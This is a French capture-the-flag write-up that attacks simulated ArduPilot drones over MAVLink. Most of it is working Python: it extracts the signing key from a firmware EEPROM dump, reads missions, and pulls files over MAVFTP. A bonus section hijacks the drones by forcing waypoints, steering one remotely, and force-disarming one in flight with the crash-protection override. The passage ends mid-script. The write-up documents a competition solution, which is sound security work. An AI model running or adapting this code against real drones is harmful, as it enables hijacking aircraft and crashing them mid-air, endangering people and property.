+++
title = 'Drone Hacking'
date = 2026-08-09T12:34:36-04:00
description = "Cet article se base sur la résolution d'un challenge de cyber sécurité : STARPWN organisé à la DEFCON 34"
tags = ["CTF", "Sécurité Offensive", "Reverse Firmware", "MAVLink protocole"]
categories = ["CTF Writeup"]
+++


WriteUp : By Youness LAGNAOUI 

Cet article liste mes étapes de résolution d'un challenge de pentest de drone développé par les organisateurs du CTF STARPWN dans le cadre de la DEFCON 34 (https://defcon.org/)

![Resize](/images/drones/challenge.png?width=200px) 


---

Infos mises à dispo : 
- Firmware d'un drone (qui contient une clé de signature de communication commune aux autres drones au vu de l'énoncé)
- Une interface web qui affiche en temps réel les déplacements ainsi que les status des drones (5 drones)
- Une connexion *MAVlink Telemetry* qui permet d'interagir directement avec la navigation des drones  

---

Raisonnement de réalisation du challenge : 
- Analyser le firmaware des drones pour en extraire une clé de signature des communications avec les drones
- Interagir directement avec les drones afin d'extraire des informations contenues au sein des drones
- Bonus : prendre le contrôle des drones à distance 


# Etape 1 : Reverse Firmware drone 

![Resize](/images/drones/Firmware.png?width=200px) 

utilisation de l'IA pour analysier le binaire : 

![Resize](/images/drones/Claude_Firm1.png?width=200px) 

Claude a également découvert le repo Github du firmware divulgant le ```SIGNING_KEY_MAGIC```  : 

![Resize](/images/drones/Github_leak.png?width=200px) 


source : https://github.com/ArduPilot/ardupilot/blob/master/libraries/GCS_MAVLink/GCS_Signing.cpp

Claude finit par identifier la structure de création des signatures permettant la communication avec les drones : 

![Resize](/images/drones/Claude2.png?width=200px) 

Ainsi nous pouvons construire un code qui permet de générer la clé permettant la signatures des communication entre les drones : 



```python
#!/usr/bin/env python3
"""
Extraction de la clé de signature MAVLink2 depuis un dump EEPROM ArduPilot.

ArduPilot stocke la clé de signature partagée dans la région "StorageKeys"
du StorageManager, à l'offset 0x1F80 pour les cartes avec 16 Ko de stockage.

Structure C++ du firmware (non PACKED, donc avec padding d'alignement) :

    struct SigningKey {
        uint32_t magic;        // = 0x3852fcd1 (SIGNING_KEY_MAGIC)
        uint64_t timestamp;
        uint8_t  secret_key[32];
    };

Sur une architecture 32 bits, le compilateur insère 4 octets de padding
après `magic` pour aligner `timestamp` (uint64_t) sur 8 octets :

    offset 0  : magic       (4 octets)
    offset 4  : padding     (4 octets)
    offset 8  : timestamp   (8 octets)
    offset 16 : secret_key  (32 octets)
"""

import struct
import sys

EEPROM_PATH = "eeprom.bin"
STORAGE_KEYS_OFFSET = 0x1F80   # 8064, offset de la région StorageKeys (cartes 16 Ko)
SIGNING_KEY_MAGIC = 0x3852FCD1


def extract_signing_key(path: str) -> bytes:
    with open(path, "rb") as f:
        data = f.read()

    print(f"[*] Fichier lu : {path} ({len(data)} octets)")

    if len(data) < STORAGE_KEYS_OFFSET + 48:
        raise ValueError("Fichier trop petit pour contenir la région StorageKeys")

    chunk = data[STORAGE_KEYS_OFFSET:STORAGE_KEYS_OFFSET + 64]

    # --- Parsing avec alignement correct (padding de 4 octets après magic) ---
    magic = struct.unpack_from("<I", chunk, 0)[0]
    timestamp = struct.unpack_from("<Q", chunk, 8)   # après magic(4) + padding(4)
    secret_key = chunk[16:16 + 32]

    print(f"[*] Offset StorageKeys : 0x{STORAGE_KEYS_OFFSET:04X}")
    print(f"[*] Magic lu           : 0x{magic:08X}")
    print(f"[*] Magic attendu      : 0x{SIGNING_KEY_MAGIC:08X}")

    if magic != SIGNING_KEY_MAGIC:
        print("[!] ATTENTION : le magic ne correspond pas — offset ou struct incorrects.")
        sys.exit(1)

    print("[+] Magic vérifié, structure confirmée.")
    print(f"[*] Timestamp (brut)   : {timestamp[0]}")
    print(f"[+] Clé de signature   : {secret_key.hex()}")
    print(f"[*] Longueur clé       : {len(secret_key)} octets")

    return secret_key


if __name__ == "__main__":
    key = extract_signing_key(EEPROM_PATH)
    print("\n=== Résultat ===")
    print(f"secret_key = bytes.fromhex(\"{key.hex()}\")")
``` 


![Resize](/images/drones/Key_extract.png?width=200px) 


On obtient la clé : d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126

Cette clé permet de signer toutes les communications entre les drones. 




# Etape 2 : Collecte d'informations opérationnelles 

## 1. identification des ID MAVLink des drones : 

Nous avons accès à une interface web qui donne des indications sur la postions et le statuts des différents drones : 

![Resize](/images/drones/dashboard1.png?width=200px) 


![Resize](/images/drones/dashboard2.png?width=200px) 


Les informations intéressantes exposées sur la plateforme web sont : 

- Mode du drone (pilote auto)
- Sont état de fonctionnement (AMRMED = en vol)
- Position 
- Niveau d'avancement de parcours en autopilote (Waypoint)

Interceptons si d'éventuelles requêtes sont émises par l'application web divulguant des informations plus précises sur les drones : 

![Resize](/images/drones/request1.png?width=200px) 

![Resize](/images/drones/request2.png?width=200px) 

Une série de web socket est transmises vers l'application web divulguant les ID des différents drones confirmant que chacun des drones possèdent un ID déductible (ex drone 1 : sysid 1 ; drone 3 : sysid 3 etc....). 



## 2. Identification des trajets automatiques des drones : 

Maintenant que nous avons les sysid des drones nous pouvons tester si la clé que nous avons obtenue à l'étape précédente est correcte en développant un script python qui s'interface directement avec la connexion TCP : 


```python 
import os
os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil
import time

secret_key = bytes.fromhex("d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126")

mav = mavutil.mavlink_connection('tcp:0.cloud.chals.io:34085', source_system=255, source_component=190)
mav.setup_signing(secret_key, sign_outgoing=True)

TARGET_SYSIDS = [1, 2, 3, 4, 5]
PRE_JUMP_SEQ = {1: 54, 2: 22, 3: 26, 4: 32, 5: 29}  # seq attendu à l'arrêt pour chaque agent

last_hb = 0
last_print = {}
requested = False
reached_final = {sysid: False for sysid in TARGET_SYSIDS}

print("[*] Écoute multi-agents détaillée - Ctrl+C pour arrêter...\n")


try:
    while True:
        msg = mav.recv_match(
            type=["STATUSTEXT", "COMMAND_ACK", "TIMESYNC", "HEARTBEAT",
                  "MISSION_CURRENT", "MISSION_ITEM_REACHED", "GLOBAL_POSITION_INT"],
            blocking=True, timeout=2
        )

        if msg is not None:
            t = msg.get_type()
            sysid = msg.get_srcSystem()

            if t == "STATUSTEXT":
                print(f"[STATUSTEXT] sys={sysid} sev={msg.severity} : {msg.text}")

            elif t == "COMMAND_ACK":
                print(f"[COMMAND_ACK] sys={sysid} cmd={msg.command} result={msg.result}")

            elif t == "TIMESYNC" and msg.tc1 == 0:
                mav.mav.timesync_send(int(time.time() * 1e6), msg.ts1)

            elif t == "MISSION_CURRENT":
                print(f"[MISSION_CURRENT] sys={sysid} seq={msg.seq}")

            elif t == "MISSION_ITEM_REACHED":
                print(f"[MISSION_ITEM_REACHED] sys={sysid} seq={msg.seq}")
                if sysid in PRE_JUMP_SEQ and msg.seq == PRE_JUMP_SEQ[sysid]:
                    if not reached_final[sysid]:
                        reached_final[sysid] = True
                        print(f">>> sys={sysid} A ATTEINT SON DERNIER WAYPOINT ({msg.seq}) <<<")

            elif t == "GLOBAL_POSITION_INT":
                pass  # trop verbeux, ignoré sauf besoin ponctuel

            elif t == "HEARTBEAT" and msg.type != mavutil.mavlink.MAV_TYPE_GCS:
                if time.time() - last_print.get(sysid, 0) > 3:
                    last_print[sysid] = time.time()
                    armed = bool(msg.base_mode & 128)
                    print(f"[HEARTBEAT] sys={sysid} custom_mode={msg.custom_mode} "
                          f"armed={armed} system_status={msg.system_status}")

        if time.time() - last_hb > 1:
            mav.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
            last_hb = time.time()

        if all(reached_final.values()):
            print("\n🎯 TOUS LES AGENTS ONT ATTEINT LEUR DERNIER WAYPOINT !\n")

except KeyboardInterrupt:
    print("\n[*] Arrêt.")

```


![Resize](/images/drones/drone_read1.png?width=200px) 

On reçois bien les différents statuts des drones. La clé identifiée en étape 1 est donc valide et permet de communiquer avec l'ensemble des drones. 

Identifions les trajets prévus par les pilotes automatiques des drones : 



```python
import os
os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil
import time

CONN_STR = 'tcp:0.cloud.chals.io:34085'
SECRET_KEY_HEX = "d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126"
TARGET_SYSIDS = [1, 2, 3, 4, 5]
TARGET_COMPID = 1

secret_key = bytes.fromhex(SECRET_KEY_HEX)
mav = mavutil.mavlink_connection(CONN_STR, source_system=255, source_component=190)
mav.setup_signing(secret_key, sign_outgoing=True)

last_hb = 0
current_target_idx = 0
mission_count = None
mission_items = {}
results = {}
sysid = TARGET_SYSIDS[current_target_idx]
requested_list = False
last_recv = time.time()

print(f"[*] Récupération mission sysid={sysid}...")
while current_target_idx < len(TARGET_SYSIDS):
    sysid = TARGET_SYSIDS[current_target_idx]
    msg = mav.recv_match(blocking=True, timeout=1)
    if msg is not None:
        t = msg.get_type()
        if t == "TIMESYNC" and msg.tc1 == 0:
            mav.mav.timesync_send(int(time.time()*1e6), msg.ts1)
        if msg.get_srcSystem() == sysid:
            if t == "MISSION_COUNT":
                mission_count = msg.count
                mav.mav.mission_request_int_send(sysid, TARGET_COMPID, 0)
                last_recv = time.time()
            if t in ("MISSION_ITEM_INT", "MISSION_ITEM"):
                mission_items[msg.seq] = msg.to_dict()
                last_recv = time.time()
                nxt = msg.seq + 1
                if mission_count is not None and nxt < mission_count and nxt not in mission_items:
                    mav.mav.mission_request_int_send(sysid, TARGET_COMPID, nxt)
    if not requested_list:
        requested_list = True
        mav.mav.mission_request_list_send(sysid, TARGET_COMPID)
    if time.time() - last_hb > 1:
        mav.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        last_hb = time.time()
    done = mission_count is not None and len(mission_items) >= mission_count
    timeout = mission_count is not None and time.time() - last_recv > 4
    no_response = requested_list and mission_count is None and time.time() - last_recv > 4
    if done or timeout or no_response:
        results[sysid] = dict(sorted(mission_items.items()))
        print(f"[*] sysid={sysid} : {len(mission_items)}/{mission_count} items récupérés")
        current_target_idx += 1
        mission_items = {}
        mission_count = None
        requested_list = False
        last_recv = time.time()


def command_name(cmd_id):
    """Retourne le nom lisible d'une commande MAV_CMD_* à partir de son ID."""
    try:
        return mavutil.mavlink.enums["MAV_CMD"][cmd_id].name
    except KeyError:
        return f"UNKNOWN_CMD_{cmd_id}"


# === Affichage détaillé complet de chaque mission ===
for sysid in TARGET_SYSIDS:
    items = results.get(sysid, {})
    print("\n" + "=" * 70)
    print(f" MISSION COMPLÈTE - sysid={sysid} ({len(items)} items)")
    print("=" * 70)
    if not items:
        print("  (aucune mission récupérée pour cet agent)")
        continue

    for seq in sorted(items.keys()):
        it = items[seq]
        cmd = it.get("command")
        cmd_str = command_name(cmd)
        print(
            f"  #{seq:3d}  {cmd_str:25s} "
            f"p1={it.get('param1'):>10} p2={it.get('param2'):>10} "
            f"p3={it.get('param3'):>10} p4={it.get('param4'):>10}  "
            f"x={it.get('x'):>12} y={it.get('y'):>12} z={it.get('z'):>8}  "
            f"frame={it.get('frame')} current={it.get('current')} "
            f"autocontinue={it.get('autocontinue')}"
        )

# === Résumé condensé (dernier item de chaque mission) ===
print("\n" + "=" * 70)
print(" RÉSUMÉ - dernier item de chaque mission")
print("=" * 70)
for sysid, items in results.items():
    if items:
        last_seq = max(items.keys())
        last = items[last_seq]
        print(f"sysid={sysid} -> #{last_seq} {command_name(last.get('command'))} : {last}")
    else:
        print(f"sysid={sysid} -> aucune mission récupérée (agent pas actif sur ce lien ?)")
```


![Resize](/images/drones/drone_read2.png?width=200px) 


On a pu extraire les itinéraires complets des drones. Grace à ce genre d'information on peut prédire à l'avance à quel endroit sera un drone. 

Dans le cadre du challenge les informations d'états et de position des drones ne permettent pas de récupérer le flag. 


Essayons donc d'exfiltrer des informations qui pourraient être contenues à l'intérieur des drones : 

## 3. Extraction des fichiers présents au sein des drones : 

Parmis les actions pas en lien avec la navigation et l'état des drones, une action intéressante est possible via le MAVLink protocole : **Extraire les fichiers contenus au sein des drones via FTP**:


```python
import os
os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil, mavftp
import time

CONN_STR = 'tcp:0.cloud.chals.io:34085'
SECRET_KEY_HEX = "d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126"
COMPID = 1
TARGET_SYSIDS = [1, 2, 3, 4, 5]
GUIDED = 4

secret_key = bytes.fromhex(SECRET_KEY_HEX)
mav = mavutil.mavlink_connection(CONN_STR, source_system=255, source_component=190)
mav.setup_signing(secret_key, sign_outgoing=True)

print("[*] Envoi direct des commandes à tous les sysid, sans attendre de découverte...\n")

# heartbeat initial pour se présenter comme GCS
mav.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)


print("\n>> Tentative MAVFTP directe sur sysid=1 (LIST /)")
ftp = mavftp.MAVFTP(mav, target_system=1, target_component=COMPID)
try:
    result = ftp.cmd_list(['/'])
    print("FTP result:", result)
    if hasattr(ftp, 'list_result'):
        for entry in ftp.list_result:
            print("  ", entry)
except Exception as e:
    print("FTP exception:", e)

# écoute passive de tout ce qui revient pendant 15s
print("\n[*] Écoute passive pendant 15s pour capter les réponses...\n")
end_time = time.time() + 15
last_hb = 0

while time.time() < end_time:
    msg = mav.recv_match(blocking=True, timeout=1)
    if msg is not None:
        t = msg.get_type()
        sysid = msg.get_srcSystem()
        if t in ("FILE_TRANSFER_PROTOCOL"):
            print(f"<<< {t} sys={sysid} : {msg.to_dict()}")
        elif t == "TIMESYNC" and msg.tc1 == 0:
            mav.mav.timesync_send(int(time.time() * 1e6), msg.ts1)

    if time.time() - last_hb > 1:
        mav.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        last_hb = time.time()

print("\n[*] Fin.")

```


![Resize](/images/drones/drone_ftp1.png?width=200px) 

On peut lister les dossier présents sur le drone 1. 

Listons les fichiers présents au sein de ces dossiers pour voir si le flag se trouve dedans : 

```python
import os
os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil, mavftp
import time

CONN_STR = 'tcp:0.cloud.chals.io:34085'
SECRET_KEY_HEX = "d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126"
COMPID = 1
SYSID = 1

secret_key = bytes.fromhex(SECRET_KEY_HEX)
mav = mavutil.mavlink_connection(CONN_STR, source_system=255, source_component=190)
mav.setup_signing(secret_key, sign_outgoing=True)
mav.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)

ftp = mavftp.MAVFTP(mav, target_system=SYSID, target_component=COMPID)

def list_dir(path):
    print(f"\n=== LIST {path} ===")
    try:
        result = ftp.cmd_list([path])
        entries = list(getattr(ftp, 'list_result', []))
        for e in entries:
            kind = "DIR " if e.is_dir else f"FILE({e.size_b}b)"
            print(f"  {kind:14s} {e.name}")
        return entries
    except Exception as e:
        print("  Erreur:", e)
        return []

# racine déjà connue
roots = ["/DCIM", "/terrain", "/@SYS", "/@ROMFS"]

for root in roots:
    entries = list_dir(root)
    # explore un niveau de plus pour chaque sous-dossier trouvé
    for e in entries:
        if e.is_dir and e.name not in (".", ".."):
            sub = f"{root}/{e.name}"
            list_dir(sub)

print("\n[*] Exploration terminée.")
```

![Resize](/images/drones/drone_ftp2.png?width=200px) 

On observe que l'un des fichiers contenu au sein du drone numéro 1 se nomme flag.jpg. 

faisons un code pour extraire l'image du drone : 


```python
import os
os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil, mavftp
import time

CONN_STR = 'tcp:0.cloud.chals.io:34085'
SECRET_KEY_HEX = "d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126"
COMPID = 1
SYSID = 1

secret_key = bytes.fromhex(SECRET_KEY_HEX)
mav = mavutil.mavlink_connection(CONN_STR, source_system=255, source_component=190)
mav.setup_signing(secret_key, sign_outgoing=True)
mav.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)

ftp = mavftp.MAVFTP(mav, target_system=SYSID, target_component=COMPID)

print("[*] Ouverture de /DCIM/flag.jpg ...")
ftp.cmd_get(['/DCIM/flag.jpg', 'flag.jpg'])

print("[*] récupération des réponses jusqu'à la fin du téléchargement (30s max)...")
result = ftp.process_ftp_reply('OpenFileRO', timeout=30)
result.display_message()

if os.path.exists('flag.jpg'):
    size = os.path.getsize('flag.jpg')
    print(f"\n[*] Fichier téléchargé : flag.jpg ({size} octets)")
else:
    print("\n[!] Toujours pas de fichier local.")
```

![Resize](/images/drones/flag.png?width=200px) 


On obtient l'image contenue dans le drone ! 

Flag final : 

```
starpwn{machines_never_pledged_to_be_allegiant}
```



# (Bonus) Prendre le contrôle des drones : 


Pour aller au delà de la résolution du challenge qui consistait à exfiltrer les images prises par les drones directement via protocole MAVLinkFTP après récupération de clé de chiffrement des communications des drones. Il est possible maintenant de prendre le controle des drones pour effectuer ce type d'actions : 

- Modifier les instructions de pilotage automatique 
- Piloter les drones à distance 
- Mettre hors service les drones 


## 4. Modification des instructions de pilotage automatique

La version la plus discrète pour modifier les instructions de pilotage automatique des drones est de volontairement leurs envoyer l'indication qu'ils sont déjà à la fin de leurs parcours en forçant les valeurs des **Waypoints**. 

Les Waypoints correspondent aux différentes étapes (coordonnées spatiales en l'occurrence) que le drone doit atteindre et qui constituent le parcours que celui-ci doit effectuer. 

Ainsi si on envoie directement aux drones qu'ils sont au dernier Waypoint alors on trompe les drones en leur indiquant qu'ils sont à la fin de leurs parcours, forçant ainsi leurs retours à leurs points d'origine : 


![Resize](/images/drones/dashboard3.png?width=200px) 


On observe que les drones patrouilles sur la carte présentée sur l'interface web. 

Ecrivons un code python qui force la valeur des Waypoint et écrit la valeur maximale forçant les drone à interrompre leur patrouille et à revenir à leurs points d'origine : 

```python
import os
os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil
import time

CONN_STR = 'tcp:0.cloud.chals.io:27838'
SECRET_KEY_HEX = "d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126"
TARGET_COMPID = 1
AUTO = 3
TARGET_SYSIDS = [2, 3, 4, 5]

secret_key = bytes.fromhex(SECRET_KEY_HEX)
mav = mavutil.mavlink_connection(CONN_STR, source_system=255, source_component=190)
mav.setup_signing(secret_key, sign_outgoing=True)

last_hb = 0

# --- Étape 1 : récupérer dynamiquement MISSION_COUNT pour chaque agent ---
mission_counts = {}
requested_count = {sysid: False for sysid in TARGET_SYSIDS}

print("[*] Récupération du nombre d'items de mission pour chaque agent...\n")

while len(mission_counts) < len(TARGET_SYSIDS):
    msg = mav.recv_match(type=["MISSION_COUNT", "TIMESYNC"], blocking=True, timeout=1)

    if msg is not None:
        t = msg.get_type()
        if t == "TIMESYNC" and msg.tc1 == 0:
            mav.mav.timesync_send(int(time.time() * 1e6), msg.ts1)
        elif t == "MISSION_COUNT":
            sysid = msg.get_srcSystem()
            if sysid in TARGET_SYSIDS and sysid not in mission_counts:
                mission_counts[sysid] = msg.count
                print(f">> sysid={sysid} : {msg.count} items")

    for sysid in TARGET_SYSIDS:
        if not requested_count[sysid]:
            requested_count[sysid] = True
            mav.mav.mission_request_list_send(sysid, TARGET_COMPID)

    if time.time() - last_hb > 1:
        mav.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        last_hb = time.time()

# le dernier item est un DO_JUMP (repeat=0) -> on cible l'avant-dernier (le vrai waypoint)
PRE_JUMP_SEQ = {sysid: count - 2 for sysid, count in mission_counts.items()}
print(f"\n[*] Cibles (avant-dernier item = avant le DO_JUMP) : {PRE_JUMP_SEQ}\n")

# --- Étape 2 : armement -> AUTO -> saut vers l'avant-dernier item ---
arm_sent = {sysid: False for sysid in TARGET_SYSIDS}
armed_confirmed_at = {sysid: None for sysid in TARGET_SYSIDS}
mode_sent = {sysid: False for sysid in TARGET_SYSIDS}
mode_confirmed_at = {sysid: None for sysid in TARGET_SYSIDS}
jump_sent = {sysid: False for sysid in TARGET_SYSIDS}

WAIT_AFTER_AUTO = 8.0

print("[*] Armement -> AUTO -> saut vers avant-dernier item...\n")

while True:
    msg = mav.recv_match(
        type=["STATUSTEXT", "COMMAND_ACK", "MISSION_ITEM_REACHED", "MISSION_CURRENT", "HEARTBEAT"],
        blocking=True, timeout=2
    )

    if msg is not None:
        t = msg.get_type()
        sysid = msg.get_srcSystem()

        if sysid in TARGET_SYSIDS:
            if t == "STATUSTEXT":
                print(f"[STATUSTEXT] sys={sysid} : {msg.text}")
            elif t == "COMMAND_ACK":
                print(f"[COMMAND_ACK] sys={sysid} cmd={msg.command} result={msg.result}")
            elif t == "MISSION_ITEM_REACHED":
                print(f"[MISSION_ITEM_REACHED] sys={sysid} seq={msg.seq}")
            elif t == "MISSION_CURRENT":
                print(f"[MISSION_CURRENT] sys={sysid} seq={msg.seq}")
            elif t == "HEARTBEAT":
                armed = bool(msg.base_mode & 128)
                if armed and armed_confirmed_at[sysid] is None:
                    armed_confirmed_at[sysid] = time.time()
                    print(f">> sysid={sysid} confirmé ARMÉ")
                if msg.custom_mode == AUTO and mode_confirmed_at[sysid] is None:
                    mode_confirmed_at[sysid] = time.time()
                    print(f">> sysid={sysid} confirmé en AUTO")

    for sysid in TARGET_SYSIDS:
        if not arm_sent[sysid]:
            arm_sent[sysid] = True
            print(f">> ARM sysid={sysid}")
            mav.mav.command_long_send(
                sysid, TARGET_COMPID,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0,
                1, 0, 0, 0, 0, 0, 0
            )

    for sysid in TARGET_SYSIDS:
        if arm_sent[sysid] and not mode_sent[sysid]:
            mode_sent[sysid] = True
            print(f">> DO_SET_MODE AUTO sysid={sysid}")
            mav.mav.command_long_send(
                sysid, TARGET_COMPID,
                mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                AUTO, 0, 0, 0, 0, 0
            )

    for sysid, seq in PRE_JUMP_SEQ.items():
        if (mode_confirmed_at[sysid] is not None
                and not jump_sent[sysid]
                and time.time() - mode_confirmed_at[sysid] > WAIT_AFTER_AUTO):
            jump_sent[sysid] = True
            print(f">> Saut vers avant-dernier item seq={seq} -> sysid={sysid}")
            mav.mav.mission_set_current_send(sysid, TARGET_COMPID, seq)
            mav.mav.command_long_send(
                sysid, TARGET_COMPID, 224, 0,  # MAV_CMD_DO_SET_MISSION_CURRENT
                seq, 0, 0, 0, 0, 0, 0
            )

    if time.time() - last_hb > 1:
        mav.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        last_hb = time.time()

    if all(jump_sent.values()):
        print("\n[*] Saut envoyé pour tous les agents cibles.")
        break
```

![Resize](/images/drones/drone_hacked1.png?width=200px) 

![Resize](/images/drones/dashboard4.png?width=200px) 

![Resize](/images/drones/dashboard5.png?width=200px) 

Les *Waypoints* sont bien mis à leurs valeurs maximales et les drones ont brusquement fait demi tour et se regroupent à leur position d'origine : 


![Resize](/images/drones/dashboard6.png?width=200px) 

Les drones sont maintenant immobilisés en plein milieu de leurs séquence d'autopilotage. 


## 5. Pilotage manuel des drones : 

On peut passer le mode de pilotage des drones en Manuel et envoyer des actions aux drones : 


Pilotons le drone 3 : 

```python
import os
os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil
import time
import math

CONN_STR = 'tcp:0.cloud.chals.io:27838'
SECRET_KEY_HEX = "d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126"
TARGET_COMPID = 1
SYSID = 3
GUIDED = 4

# Amplitude du zigzag (en mètres)
ZIGZAG_AMPLITUDE_M = 75.0
ZIGZAG_PERIOD_S = 2.0        # durée d'un demi-cycle (gauche <-> droite)
DEMO_DURATION_S = 30.0       # durée totale de la démo

secret_key = bytes.fromhex(SECRET_KEY_HEX)
mav = mavutil.mavlink_connection(CONN_STR, source_system=255, source_component=190)
mav.setup_signing(secret_key, sign_outgoing=True)

last_hb = 0

# --- Position codée en dur (pas de récupération dynamique) ---
target_sys = SYSID
target_comp = TARGET_COMPID
base_lat = 36.086129
base_lon = -115.185589
base_alt = 50.0        # altitude relative en mètres (ajuster si besoin)
base_heading = 0.0     # cap de référence en degrés (0 = nord), ajuster si besoin

print(f">> Position de départ (fixe) : lat={base_lat:.7f} lon={base_lon:.7f} "
      f"alt={base_alt:.1f}m heading={base_heading:.0f}°\n")


def meters_to_latlon_offset(lat_deg, dx_m, dy_m):
    """Convertit un décalage en mètres (est/nord) en delta lat/lon approximatif."""
    d_lat = dy_m / 111320.0
    d_lon = dx_m / (111320.0 * math.cos(math.radians(lat_deg)))
    return d_lat, d_lon


# Direction perpendiculaire au cap de référence (pour un zigzag "gauche-droite" propre)
perp_heading = math.radians(base_heading + 90)
dx_unit = math.sin(perp_heading)  # composante est
dy_unit = math.cos(perp_heading)  # composante nord

print("[*] Passage en GUIDED...")
mav.mav.command_long_send(
    target_sys, target_comp,
    mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
    GUIDED, 0, 0, 0, 0, 0
)
time.sleep(1)

print("[*] ARM (au cas où)...")
mav.mav.command_long_send(
    target_sys, target_comp,
    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0,
    1, 0, 0, 0, 0, 0, 0
)
time.sleep(1)

print(f"\n[*] Zigzag en cours pendant {DEMO_DURATION_S:.0f}s (amplitude ±{ZIGZAG_AMPLITUDE_M:.0f}m, période {ZIGZAG_PERIOD_S:.1f}s)...\n")

start = time.time()
last_target_send = 0

while time.time() - start < DEMO_DURATION_S:
    msg = mav.recv_match(type=["STATUSTEXT", "TIMESYNC"], blocking=True, timeout=0.2)
    if msg is not None:
        t = msg.get_type()
        if t == "TIMESYNC" and msg.tc1 == 0:
            mav.mav.timesync_send(int(time.time() * 1e6), msg.ts1)
        elif t == "STATUSTEXT" and msg.get_srcSystem() == SYSID:
            print(f"[STATUSTEXT] : {msg.text}")

    now = time.time()
    if now - last_target_send > 0.5:  # envoi fréquent pour un mouvement fluide et rapide
        last_target_send = now
        elapsed = now - start
        # signal carré (zigzag net) plutôt qu'un sinus (mouvement plus "rapide et saccadé")
        phase = (elapsed % (2 * ZIGZAG_PERIOD_S)) / ZIGZAG_PERIOD_S
        side = 1.0 if phase < 1.0 else -1.0

        offset_m = side * ZIGZAG_AMPLITUDE_M
        d_lat, d_lon = meters_to_latlon_offset(
            base_lat, dx_unit * offset_m, dy_unit * offset_m
        )
        target_lat = base_lat + d_lat
        target_lon = base_lon + d_lon

        mav.mav.set_position_target_global_int_send(
            0,
            target_sys, target_comp,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            0b0000111111111000,  # position uniquement
            int(target_lat * 1e7),
            int(target_lon * 1e7),
            base_alt,
            0, 0, 0,
            0, 0, 0,
            0, 0
        )
        print(f"  -> cible : {'DROITE' if side > 0 else 'GAUCHE':7s} "
              f"(lat={target_lat:.7f} lon={target_lon:.7f})")

    if time.time() - last_hb > 1:
        mav.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        last_hb = time.time()

print("\n[*] Fin de la démo, retour à la position de départ...")
mav.mav.set_position_target_global_int_send(
    0,
    target_sys, target_comp,
    mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
    0b0000111111111000,
    int(base_lat * 1e7),
    int(base_lon * 1e7),
    base_alt,
    0, 0, 0,
    0, 0, 0,
    0, 0
)
print("[*] Terminé.")
```

![Resize](/images/drones/dashboard7.png?width=200px) 



## 6. Désactivation des drones

On peut éteindre les drones en plein vole en "désarmant" les drones : 


![Resize](/images/drones/dashboard8.png?width=200px) 




```python
import os
os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil
import time

CONN_STR = 'tcp:0.cloud.chals.io:27838'
SECRET_KEY_HEX = "d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126"
TARGET_COMPID = 1
SYSID = 3

secret_key = bytes.fromhex(SECRET_KEY_HEX)
mav = mavutil.mavlink_connection(CONN_STR, source_system=255, source_component=190)
mav.setup_signing(secret_key, sign_outgoing=True)

last_hb = 0
disarm_sent = False

print(f"[*] Désarmement forcé du drone sysid={SYSID}...\n")

start = time.time()
while time.time() - start < 10:
    msg = mav.recv_match(type=["STATUSTEXT", "COMMAND_ACK", "HEARTBEAT", "TIMESYNC"], blocking=True, timeout=1)

    if msg is not None:
        t = msg.get_type()
        sysid = msg.get_srcSystem()

        if t == "TIMESYNC" and msg.tc1 == 0:
            mav.mav.timesync_send(int(time.time() * 1e6), msg.ts1)

        if sysid == SYSID:
            if t == "STATUSTEXT":
                print(f"[STATUSTEXT] : {msg.text}")
            elif t == "COMMAND_ACK":
                print(f"[COMMAND_ACK] cmd={msg.command} result={msg.result}")
            elif t == "HEARTBEAT":
                armed = bool(msg.base_mode & 128)
                print(f"[HEARTBEAT] armed={armed} custom_mode={msg.custom_mode}")

    if not disarm_sent:
        disarm_sent = True
        print(">> Envoi DISARM (forcé, param2=21196 pour outrepasser la protection anti-crash)")
        mav.mav.command_long_send(
            SYSID, TARGET_COMPID,
